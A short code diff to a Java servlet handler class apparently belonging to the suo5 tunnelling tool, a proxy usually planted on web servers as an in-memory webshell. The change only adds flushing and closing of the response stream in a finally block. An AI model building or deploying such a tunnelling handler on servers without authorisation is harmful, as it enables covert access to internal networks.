@@ -164,7 +164,11 @@ public class Suo5v2UndertowServletHandler implements Runnable, HostnameVerifier,
             }
         } catch (Throwable e) {
         } finally {
-
+            try {
+                OutputStream out = (OutputStream) response.getClass().getMethod("getOutputStream").invoke(response);
+                out.flush();
+                out.close();
+            } catch (Throwable ignored) {}
         }
     }
 
